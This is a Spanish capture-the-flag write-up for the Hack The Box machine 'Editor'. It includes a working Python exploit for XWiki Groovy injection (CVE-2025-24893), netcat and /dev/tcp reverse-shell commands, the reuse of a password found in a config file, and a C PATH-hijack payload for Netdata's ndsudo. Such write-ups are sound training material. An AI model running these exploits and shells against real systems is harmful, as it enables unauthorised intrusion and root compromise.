---
tags:
title: Editor - Easy (HTB)
permalink: /Editor-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash 
 nmap -sCV -p22,80,8080,51234,55555,55556,55557 10.129.249.238
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 02:26 -03
Nmap scan report for editor.htb (10.129.249.238)
Host is up (0.88s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open   http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp  open   http    Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-server-header: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.67 seconds
```

# Service enumeration

Como vemos que en puerto `80 / 8080` corre un servicio web, necesitamos hacer que el la `ip` de la maquina resuelva correctamente al dominio de la misma, el cual es `editor.htb`, para eso lo agregamos al `/etc/hosts`.

```bash
sudo echo -e '10.129.249.238\t\editor.htb' | sudo tee -a /etc/hosts
```
## editor.htb / Port 8080 

Como puedo ver, corre `xwiki`, en la pagina web.

![{40BFC4FF-A7BD-44A9-9A6C-CDA5BCAB9B12}](images/{40BFC4FF-A7BD-44A9-9A6C-CDA5BCAB9B12}.png)
 
Podemos ver en el pie de la pagina, una version para `xwiki`.

![{E4F49A19-075C-4A6A-9FC1-8ADA09085B71}](images/{E4F49A19-075C-4A6A-9FC1-8ADA09085B71}.png)
## Shell as xwiki

Al realizar una búsqueda en Firefox vi en este [enlace](https://nvd.nist.gov/vuln/detail/CVE-2025-24893) que la plataforma es vulnerable al `CVE-2024-24893`

![Pasted image 20250803153005](images/Pasted image 20250803153005.png)

> La falla reside en cómo el macro SolrSearch maneja incorrectamente expresiones Groovy dentro de las consultas de búsqueda, permitiendo a atacantes no autenticados ejecutar código Groovy arbitrario de forma remota sin autenticación o acceso previo. [OffSec]((https://www.offsec.com/blog/cve-2025-24893/))

En mi caso diseñe un `PoC` para la replicacion de este `CVE` en python.

{% raw %}
```python
import requests
import urllib.parse
import argparse
import sys

def explotar_cve_2025_24893(base_url, command):
    path = "/xwiki/bin/view/Main/SolrSearch"
    payload = f'}}}}{{{{async async=false}}}}{{{{groovy}}}}println("{command}".execute().text){{{{/groovy}}}}{{{{/async}}}}'
    payload_encoded = urllib.parse.quote(payload)
    full_url = f"{base_url.rstrip('/')}{path}?media=rss&text={payload_encoded}"

    print(f"[+] Sending Payload to: {full_url}")

    try:
        response = requests.get(full_url, timeout=10)
        print(f"[+] Status Code HTTP: {response.status_code}")
        if response.status_code == 200:
            print("[+] Possible success, partial content of the response:")
            print(response.text[:1000])
        else:
            print("[-] No 200 OK response was received..")
    except Exception as e:
        print(f"[!] Error sending request: {e}")

def exploit():
    parser = argparse.ArgumentParser(
        description="CVE-2025-24893 Exploit (Groovy injection in XWiki via RSS).",
        usage="%(prog)s -u <url> -c <command>"
    )
    parser.add_argument('-u', '--url', help='Base URL of the target (example: http://editor.htb:8080)', required=True)
    parser.add_argument('-c', '--command', help='Commando to execute on the server (example: id)', required=True)

    # Si no hay argumentos, mostrar ayuda
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()
    explotar_cve_2025_24893(args.url, args.command)

if __name__ == "__main__":
    exploit()
```
{% endraw %}

Para comprobar la ejecucion de comando podemos crear un servidor en python y enviarnos una peticion desde el servidor de la pagina para ver si la misma intenta solicitar un recurso a nuestra ubicacion.

```bash
python3 CVE-2025-24893.py --url http://10.129.249.239:8080 -c 'curl http://10.10.17.19'
```

Y con exito vemos que desde nuestra otra consola la peticion nos llega.

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.249.239 - - [10/Nov/2025 02:46:24] "GET / HTTP/1.1" 200 -
10.129.249.239 - - [10/Nov/2025 02:46:26] "GET / HTTP/1.1" 200 -

```

Por lo que nos podemos enviar una `Reverse Shell` a nuestra maquina.

```bash
python3 CVE-2025-24893.py --url http://10.129.249.239:8080 -c 'busybox nc 10.10.17.19 4444 -e bash'  
[+] Sending Payload to: http://10.129.249.239:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22busybox%20nc%2010.10.17.19%204444%20-e%20bash%22.execute%28%29.text%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[+] Status Code HTTP: 200
[+] Possible success, partial content of the response:
<!DOCTYPE html>
                              
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" data-xwiki-paged-media="paper" data-xwiki-reference="xwiki:Main.SolrSearch" data-xwiki-document="Main.SolrSearch" data-xwiki-wiki="xwiki" data-xwiki-space="Main" data-xwiki-page="SolrSearch" data-xwiki-isnew="false" data-xwiki-version="1.1" data-xwiki-rest-url="/xwiki/rest/wikis/xwiki/spaces/Main/pages/SolrSearch" data-xwiki-locale="" data-xwiki-form-token="MZxnrPSxDgK1p5ZF6xpwMA">
  <head>
                    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
                                    <title>XWiki - Main - Solr Search</title>
            <meta name="viewport" content="width=device-width, initial-scale=1" />
                <link rel="icon" href="/xwiki/resources/icons/xwiki/favicon16.png?cache-version=1711538036000" type="image/png" />
        <link rel="icon" href="/xwiki/resources/icons/xwiki/favicon.svg?cache-version=1711538036000" type="ima
```

Y desde nuestro listener `nc` anteriormente seteado, recibimos la shell.

```bash
sudo nc -nlvp 4444            
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.249.239] 56032
whoami
xwiki
```

## Shell as oliver

### Enumeration

Dentro de la ruta `/usr/lib/xwiki/WEB-INF` vemos varios archivos de la web, donde dentro de uno de ellos estan las credenciales del usuario `oliver`, sabemos que son de el ya que el unico usuaroi despues de `xwiki` y `root` con una bash asignada.

```bash
xwiki@editor:/usr/lib/xwiki/WEB-INF$ cat hibernate.cfg.xml  | grep "password"
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```

Ya una vez que tenemos sus credenciales podemos conectarnos via `ssh`.

```bash 
ssh oliver@10.129.249.239                              
The authenticity of host ''10.129.249.239 (10.129.249.239)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:44: [hashed name]
    ~/.ssh/known_hosts:69: [hashed name]
    ~/.ssh/known_hosts:70: [hashed name]
    ~/.ssh/known_hosts:71: [hashed name]
    ~/.ssh/known_hosts:72: [hashed name]
    ~/.ssh/known_hosts:92: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

[..snip..]


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov 10 05:59:48 2025 from 10.10.17.19
oliver@editor:~$
```

## Shell as root

### Enumeration

Una vez dentro de la mquina vemos que `oliver` forma parte del grupo `netdata`.

```bash
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

Por lo que enumere `archivos`, `binarios`, o `scripts` para este grupo.

```bash
find / -group netdata 2>/dev/null 
/run/ebpf.pid
/run/netdata/netdata.pid
/tmp/netdata-ipc
/opt/netdata/var
/opt/netdata/var/cache
/opt/netdata/var/cache/netdata
/opt/netdata/var/cache/netdata/netdata-meta.db
/opt/netdata/var/cache/netdata/dbengine
[..snip..]
```

Hay demasiado output, por lo que podria ver si hay alguno proceso corriendo internamente donde se ejecute algo relacionado a este grupo

```bash
oliver@editor:~$ ps -faux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
oliver      3775  0.0  0.1   8788  5580 pts/0    Ss   05:59   0:00 -bash
oliver      4160  0.0  0.0  10464  3752 pts/0    R+   06:03   0:00  \_ ps -faux
oliver      3683  0.0  0.2  17080  9704 ?        Ss   05:59   0:00 /lib/systemd/systemd --user
```

Pero como veo que no, liste puertos abiertos localmente en la maquina.

```bash
oliver@editor:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46291         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN      -                   
udp        0      0 127.0.0.1:8125          0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

Hay varios puertos, pero el que me interesa es el puerto `19999`, voy a hacer un local `Port Forwarding`, para ver que es lo que corre dentro de ese puerto ya qeu podria ser `Netdata`.

```bash 
ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
```

Ahora nos podemos ir a la pagina a ver que servicio es y podriamos confirmar que sea `Netdata`.

![{E4B08CD8-6687-4A27-83CD-F27BA86AE26C}](images/{E4B08CD8-6687-4A27-83CD-F27BA86AE26C}.png)

Ademas dentro de la misma pagina puedo ver que sale una advertencia la cual dice que hay q actualizar el servicio a la versión `v1.46.0`.

![{0C1DEA2F-641A-4905-BCD7-6C4E894972FD}](images/{0C1DEA2F-641A-4905-BCD7-6C4E894972FD}.png)

Si buscamos por *Netdata 1.45.2* vemos que hay esta el `CVE-2024-32019` el cual dice que la herramienta `ndsudo` tiene SUID `root` y permite ciertos comando pero este usa el `PATH` del usuario para buscarlo, el cual nos hace pensar que podemos performar un `Path Hijacking` para que cuando el binario se ejecute lo haga con privilegios elevados `(Root)`.

Para proceder con la explotacion creamos un binario en `C#` el cual nos envie una shell a nuestro sistema cual el binario sea ejecutado

```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.16.10/1337 0>&1", NULL);
    return 0;
}
```

Pasamos a compilarlo 

```bash 
gcc -o nvme exploit.c
```

Pasamos a moverlo a la maquina victima 

```bash 
python3 -m http.server 80
```

```bash 
cd /tmp
wget http://10.10.16.10/nvme
```

```bash 
export PATH=/tmp:$PATH
```

Y ejecutamos el binario con `ndsudo` pero antes poniendonos en escucha con `netcat`.

```bash 
nc -nlvp 1337
```

```bash 
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

Y veo como con exito recibo mi shell como `root` desde mi otra consola
```bash
 sudo nc -nlvp 1337            
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.249.239] 58156
root@editor:/tmp# whoami
whoami
root
root@editor:/tmp#
```

```bash
root@editor:/tmp# cat /root/root.txt
cat /root/root.txt
f473847c87257948d7f97c7ec40d0bde
```

`~Happy Hacking.`
